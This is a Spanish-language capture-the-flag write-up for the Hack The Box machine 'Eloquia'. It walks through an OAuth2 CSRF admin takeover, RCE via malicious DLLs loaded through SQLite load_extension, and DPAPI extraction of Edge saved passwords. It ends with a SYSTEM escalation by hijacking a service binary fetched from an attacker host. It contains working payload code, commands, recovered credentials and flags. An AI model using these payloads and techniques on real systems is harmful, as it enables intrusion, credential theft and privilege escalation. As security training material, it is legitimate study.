# HTB Machine: Eloquia (Insane) — Writeup Completo
**IP:** 10.129.244.81
**SO:** Windows Server 2019 (Build 17763) — WORKGROUP
**Dificultad:** Insane
**Fecha:** 2026-02-18 / 2026-02-19
**Estado:** ✅ COMPLETADA — Ambas flags obtenidas

**Flags:**
- 🚩 User: `d9d26bc045a0a9187330ced25d01a1c1`
- 🚩 Root: `f9fdb8a2ffd80223ca5e319f5c46a5cf`

---

## Resumen de la Cadena de Ataque

```
OAuth2 CSRF + AngularJS XSS (CVE-2025-2336)
    → Secuestro de cuenta Admin
        → RCE via SQLite load_extension() (inyección de DLL)
            → Shell como usuario "web" → Flag de Usuario
                → Extracción de credenciales Edge via DPAPI (AES-256-GCM)
                    → Credenciales de Olivia.KAT → WinRM
                        → Hijack del binario Failure2Ban.exe (Condición de carrera)
                            → SYSTEM → Flag de Root
```

---

## Fase 1: Reconocimiento

### Escaneo Nmap
```bash
nmap -sV -sC -p- --min-rate 5000 10.129.244.81
```

| Puerto | Servicio | Versión | Notas |
|--------|----------|---------|-------|
| 80/tcp | HTTP | Microsoft IIS 10.0 | Redirige a `http://eloquia.htb/` |
| 5985/tcp | HTTP | Microsoft HTTPAPI 2.0 | WinRM — vector de movimiento lateral |

### Hosts Virtuales
```
# /etc/hosts
10.129.244.81 eloquia.htb qooqle.htb
```

| Host | Descripción | Stack |
|------|-------------|-------|
| `eloquia.htb` | Plataforma de blog/artículos CRM | Django + AngularJS 1.8.2 + IIS 10.0 |
| `qooqle.htb` | Proveedor de identidad OAuth2 falso | Django + django-oauth-toolkit |

---

## Fase 2: Enumeración Web

### eloquia.htb — Endpoints Clave
```
/accounts/login/                    - Inicio de sesión
/accounts/register/                 - Registro de usuarios
/accounts/profile/                  - Perfil de usuario
/accounts/connect/                  - Cuentas OAuth conectadas
/accounts/admin/                    - Panel de Admin Django (Grappelli)
/accounts/oauth2/qooqle/callback/  - Callback OAuth2
/article/create/                    - Crear artículo
/article/visit/{id}/                - Ver artículo
/article/report/{id}/               - Reportar artículo → bot admin lo visita
/dev/sql-explorer/play/             - SQL Explorer (solo admin)
```

### Configuración de Seguridad
```python
# Política CSP
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)           # Sin unsafe-inline/eval
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'", "fonts.googleapis.com")
CSP_OBJECT_SRC = ("'none'",)
# Sin directiva navigate-to → navegación sin restricciones
```

### Análisis del Sanitizador HTML
| Etiqueta | Resultado |
|----------|-----------|
| `<script>`, `<iframe>`, `<img>` | ❌ Eliminadas |
| `<p>`, `<a>`, `<strong>`, `<svg>` | ✅ Permitidas |
| `<meta http-equiv="refresh">` | ✅ **Permitida** |
| `<svg><animate>` | ✅ **Permitida** |

### Bot Admin (seleniumSimulator.py)
- Se ejecuta como usuario Windows `web`
- Inicia sesión como admin de Eloquia con `admin:MyEl0qu!@Admin`
- Usa Chrome headless
- Visita artículos reportados
- Espera 3 segundos para que "se ejecute el payload XSS"
- Se activa via `schtasks /run /tn seleniumSimulator`

---

## Fase 3: OAuth2 CSRF → Secuestro de Cuenta Admin

### Vulnerabilidad: Parámetro State Ausente

El flujo OAuth2 **no tiene parámetro `state`** — sin protección CSRF:
```
http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi
  &response_type=code
  &redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/
  # ← ¡Sin parámetro state!
```

### Comportamiento del Callback
| Escenario | Resultado |
|-----------|-----------|
| Logueado + código no vinculado | Vincula cuenta Qooqle al usuario Eloquia actual |
| No logueado + código vinculado | **Inicia sesión como el usuario Eloquia vinculado** |

### Flujo del Ataque

1. **Registrar cuentas de atacante** en Eloquia y Qooqle
2. **Configurar servidor de redirección** en máquina atacante (maneja expiración de códigos):
   ```python
   # Cuando se solicita /link:
   # 1. Genera código OAuth2 fresco desde qooqle.htb
   # 2. Redirige a /accounts/oauth2/qooqle/callback/?code=CODIGO_FRESCO
   ```
3. **Crear artículo** con meta-refresh + payload SVG:
   ```html
   <meta http-equiv="refresh" content="0;url=http://IP_ATACANTE:8888/link">
   <svg><image href="http://IP_ATACANTE:8888/link"/></svg>
   ```
   Alternativa: XSS via AngularJS CVE-2025-2336 (bypass con SVG animate):
   ```html
   <svg>
     <a xlink:href="/accounts/oauth2/qooqle/callback/?code=CODIGO">
       <animate attributeName="xlink:href"
         values="/accounts/oauth2/qooqle/callback/?code=CODIGO" />
     </a>
   </svg>
   ```
4. **Reportar artículo** → bot admin lo visita → sigue redirección → vincula Qooqle del atacante con Eloquia del admin
5. **Login via Qooqle** con cuenta atacante → autenticado como **admin**

### Resultado
```
GET /accounts/profile/ → "Howdy, admin"
```
- Panel admin: `/accounts/admin/`
- SQL Explorer: `/dev/sql-explorer/play/`
- Credenciales admin encontradas: `admin:MyEl0qu!@Admin`

---

## Fase 4: RCE via SQLite load_extension()

### Descubrimiento
El backend de SQL Explorer es **SQLite** con `load_extension()` habilitado:
```sql
SELECT sqlite_version();  -- 3.40.1
SELECT load_extension('test');  -- El error confirma que la carga de extensiones está habilitada
```

### Requisitos de la DLL
- **DLL de Windows 64-bit** (x86_64)
- Función de entrada: `sqlite3_<nombre_dll>_init`
- Compilador: `x86_64-w64-mingw32-gcc`

### DLL Maliciosa (ejemplo: ejecución de comandos)
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

__declspec(dllexport) int sqlite3_payload_init(void *db, char **err, void *api) {
    system("whoami > C:\\Web\\Eloquia\\static\\assets\\images\\blog\\output.txt 2>&1");
    return 0;
}
```

### Compilar
```bash
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c
```

### Subir via Admin Django
Subir DLL como "Banner Image" del artículo en:
```
POST /accounts/admin/Eloquia/article/add/
  Campo: banner=@payload.dll
```
Archivo guardado en: `C:\Web\Eloquia\static\assets\images\blog\payload.dll`

### Ejecutar
```sql
SELECT load_extension('C:\Web\Eloquia\static\assets\images\blog\payload.dll','sqlite3_payload_init');
```

### Leer salida
```
curl http://eloquia.htb/static/assets/images/blog/output.txt
→ eloquia\web
```

### 🚩 Flag de Usuario
```bash
# Via DLL que ejecuta: type C:\Users\web\Desktop\user.txt > ...output.txt
d9d26bc045a0a9187330ced25d01a1c1
```

---

## Fase 5: Enumeración como Usuario `web`

Toda la enumeración posterior se realizó mediante ejecución de DLLs (subir DLL → load_extension → leer salida del directorio estático).

### Información del Sistema
- **SO:** Windows Server 2019 (Build 17763)
- **Dominio:** WORKGROUP (NO es Active Directory)
- **Usuarios:** Administrator, Olivia.KAT (Remote Management Users), web

### Servicio Failure2Ban
- **Binario:** `C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe`
- **Ejecuta como:** NT AUTHORITY\SYSTEM
- **Función:** Servicio .NET que lee `C:\Web\Qooqle\log.csv`, bloquea IPs via Windows Firewall tras 10 intentos fallidos
- **Config:** `App.config` → `LogFilePath = C:\Web\Qooqle\log.csv`

### FW-Cleaner.ps1 (`C:\Program Files\Automation Scripts\`)
```powershell
$rules = Get-NetFirewallRule | Where-Object {$_.Direction -eq 'Inbound' -and $_.DisplayName -like 'Block IP*'}
foreach ($rule in $rules) { Remove-NetFirewallRule -Name $rule.Name }
cmd /c "echo LOG FILE > C:\Web\Qooqle\log.csv"
Restart-Service Failure2Ban    # ← Recarga el binario al reiniciar
rm "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\version.dll"
```
- Se ejecuta cada ~5 minutos como SYSTEM
- Reinicia el servicio Failure2Ban (libera el bloqueo del archivo .exe)

### Permisos del Directorio (Failure2Ban Debug)
```
ELOQUIA\Olivia.KAT:(I)(OI)(CI)(RX,W)   ← Olivia tiene ESCRITURA
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)                   ← web solo tiene Lectura/Ejecución
```
**Bloqueo:** El usuario `web` NO PUEDE escribir en el directorio de Failure2Ban → se necesitan las credenciales de Olivia.KAT.

---

## Fase 6: Movimiento Lateral — Extracción de Credenciales Edge via DPAPI

### Descubrimiento
El bot Selenium ejecuta Microsoft Edge bajo el perfil del usuario `web`. Las credenciales guardadas se almacenan cifradas en:
- `C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State` — contiene clave maestra AES cifrada con DPAPI
- `C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data` — BD SQLite con contraseñas cifradas

### Teoría del Descifrado
Los navegadores Chromium (Edge/Chrome) cifran las contraseñas guardadas usando **AES-256-GCM**. La clave AES se almacena en `Local State` (como base64 bajo `os_crypt.encrypted_key`) y está cifrada con **Windows DPAPI**. Como nuestra DLL se ejecuta como el usuario `web`, podemos llamar a `CryptUnprotectData()` para recuperar la clave maestra.

### Formato del blob de contraseña (Chromium v10)
```
[v10]     [nonce]      [texto cifrado + tag GCM]
3 bytes   12 bytes     longitud variable
```

### DLL de Descifrado (edge_decrypt.c)
```c
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Flujo:
// 1. Leer "Local State" → encontrar "encrypted_key":"BASE64..."
// 2. Decodificar Base64 → quitar prefijo "DPAPI" de 5 bytes
// 3. CryptUnprotectData() → clave AES-256 de 32 bytes
// 4. Copiar y abrir "Login Data" (SQLite) → buscar filas en tabla logins
// 5. Para cada blob de contraseña cifrada:
//    a. Saltar prefijo "v10" (3 bytes)
//    b. Extraer IV/nonce de 12 bytes
//    c. Bytes restantes = texto cifrado + tag de autenticación GCM de 16 bytes
//    d. Fuerza bruta de longitud: probar descifrado con len 1..200
//       hasta que BCryptDecrypt tenga éxito (el tag GCM valida)
//    e. Salida: URL, usuario, contraseña descifrada

__declspec(dllexport)
int sqlite3_edgedecrypt_init(void *db, char **err, void *api) {
    // Implementación completa usa:
    //   CryptUnprotectData()  → descifrado DPAPI (funciona como usuario web)
    //   BCryptOpenAlgorithmProvider(BCRYPT_AES_ALGORITHM)
    //   BCryptSetProperty(BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM)
    //   BCryptGenerateSymmetricKey()
    //   BCryptDecrypt() con BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    return 0;
}
```

### Compilar y Ejecutar
```bash
x86_64-w64-mingw32-gcc -shared -o edge_decrypt.dll edge_decrypt.c -lcrypt32 -lbcrypt
```
Subir como banner de artículo → ejecutar via load_extension → leer salida.

### Credenciales Recuperadas
| URL | Usuario | Contraseña |
|-----|---------|------------|
| https://chatgpt.com/ | olivia.kat | S3cureP@sswd3Openai |
| https://eloquia.htb/ | test | testtest1234! |
| http://eloquia.htb/accounts/login/ | **Olivia.KAT** | **S3cureP@sswdIGu3ss** |

---

## Fase 7: WinRM como Olivia.KAT

### Conexión
```bash
evil-winrm -i 10.129.244.81 -u 'Olivia.KAT' -p 'S3cureP@sswdIGu3ss'
```

### Verificar Permisos
```powershell
*Evil-WinRM* PS> icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

ELOQUIA\Olivia.KAT:(I)(RX,W)     ← ¡ESCRITURA confirmada!
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```

Olivia.KAT puede sobrescribir `Failure2Ban.exe` → hijack de binario para obtener SYSTEM.

---

## Fase 8: Escalada de Privilegios — Hijack del Binario Failure2Ban

### Binario Malicioso para el Servicio
```c
// service_hijack.c — Se ejecuta como SYSTEM cuando el servicio Failure2Ban inicia
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Copiar flag de root a ubicación legible
    CopyFileA("C:\\Users\\Administrator\\Desktop\\root.txt",
              "C:\\temp\\root.txt", FALSE);

    // Añadir Olivia al grupo Administrators para acceso persistente
    system("net localgroup Administrators Olivia.KAT /add");

    Sleep(30000);  // Mantener proceso vivo para que el servicio no reinicie inmediatamente
    return 0;
}
```

### Compilar
```bash
x86_64-w64-mingw32-gcc -O2 -s -o service_hijack.exe service_hijack.c
```

### Transferir al Objetivo
```bash
# Atacante: servir archivo
cd /tmp && python3 -m http.server 7777
```
```powershell
# Víctima (evil-winrm como Olivia.KAT):
mkdir C:\temp
Invoke-WebRequest -Uri http://IP_ATACANTE:7777/service_hijack.exe -OutFile C:\temp\service_hijack.exe
```

### Bucle de Sobrescritura por Condición de Carrera
El `.exe` está bloqueado mientras Failure2Ban se ejecuta. FW-Cleaner.ps1 reinicia el servicio cada ~5 minutos, creando una breve ventana donde el archivo se desbloquea. Hacemos un bucle hasta que la sobrescritura tenga éxito:

```powershell
$svc = 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe'
while ($true) {
    try {
        Copy-Item C:\temp\service_hijack.exe $svc -Force -ErrorAction Stop
        Write-Host "¡EXITO - Binario reemplazado!"
        break
    } catch {
        Write-Host "." -NoNewline
    }
    Start-Sleep -Milliseconds 500
}
```

### Línea Temporal de Ejecución
```
T+0:00  FW-Cleaner.ps1 se ejecuta → Restart-Service Failure2Ban
T+0:01  Servicio se detiene → bloqueo de archivo liberado
T+0:01  Nuestro bucle sobrescribe Failure2Ban.exe con service_hijack.exe
T+0:02  Servicio inicia con nuestro binario → se ejecuta como SYSTEM
T+0:03  root.txt copiado a C:\temp\ + Olivia añadida a Administrators
```

### 🚩 Flag de Root
```powershell
*Evil-WinRM* PS> type C:\temp\root.txt
f9fdb8a2ffd80223ca5e319f5c46a5cf
```

---

## Resumen de Credenciales

| Sistema | Usuario | Contraseña | Origen |
|---------|---------|------------|--------|
| eloquia.htb (Django) | admin | MyEl0qu!@Admin | seleniumSimulator.py |
| eloquia.htb (Django) | Olivia.KAT | S3cureP@sswdIGu3ss | Edge DPAPI |
| chatgpt.com | olivia.kat | S3cureP@sswd3Openai | Edge DPAPI |
| Windows (WinRM) | Olivia.KAT | S3cureP@sswdIGu3ss | Edge DPAPI (reutilización de contraseña) |
| qooqle.htb | atk1771443256 | FreshAtk123! | Cuenta de atacante registrada |

---

## Resumen de la Cadena de Ataque Completa

| Paso | Técnica | De → A |
|------|---------|--------|
| 1 | CSRF OAuth2 (sin `state`) + meta-refresh / SVG animate | Anónimo → Sesión de Admin |
| 2 | SQLite `load_extension()` + subida de DLL via admin Django | Admin → RCE como `web` |
| 3 | Extracción de credenciales Edge via DPAPI (`CryptUnprotectData` + AES-256-GCM) | `web` → Credenciales Olivia.KAT |
| 4 | WinRM con credenciales recuperadas | `web` → Shell Olivia.KAT |
| 5 | Hijack del binario Failure2Ban.exe (condición de carrera durante reinicio del servicio) | Olivia.KAT → SYSTEM |

---

## Lecciones Aprendidas

1. **Parámetros State en OAuth2:** Su ausencia permite CSRF de vinculación de cuentas — siempre validar
2. **SQLite load_extension():** Extremadamente potente cuando está habilitado — permite cargar DLLs arbitrarias, RCE instantáneo
3. **Post-Explotación basada en DLL:** DLLs personalizadas en C via mingw permiten acceso completo a la API de Windows (DPAPI, BCrypt, etc.) — mucho más capaces que simples llamadas `system()`
4. **Forense de Credenciales del Navegador:** Las credenciales cifradas con DPAPI del navegador pueden descifrarse en proceso por el mismo usuario via `CryptUnprotectData()` sin necesitar la contraseña de Windows del usuario
5. **Hijack de Binario de Servicio:** Servicios ejecutándose como SYSTEM con binarios escribibles + reinicios periódicos = escalada de privilegios trivial
6. **Condiciones de Carrera:** El reinicio del servicio crea una breve ventana donde los archivos bloqueados se vuelven escribibles — un bucle persistente captura esta ventana de forma fiable

---

## Herramientas Utilizadas

| Herramienta | Propósito |
|-------------|-----------|
| nmap | Escaneo de puertos y enumeración de servicios |
| curl | Peticiones HTTP, gestión de cookies, flujo OAuth2 |
| x86_64-w64-mingw32-gcc | Compilación cruzada de DLLs/EXEs Windows 64-bit |
| evil-winrm | Shell remota WinRM como Olivia.KAT |
| python3 http.server | Transferencia de archivos al objetivo |
| Panel admin Django | Subida de DLL via imagen banner de artículo |
| SQL Explorer | Ejecución de DLL via `SELECT load_extension()` |

---

*Eloquia — Máquina HTB Windows Insane*
*Cadena de ataque: CSRF OAuth2 → Secuestro Admin → RCE SQLite → DPAPI Edge → WinRM → Hijack Binario → SYSTEM*
*Completada: 19 de febrero de 2026*
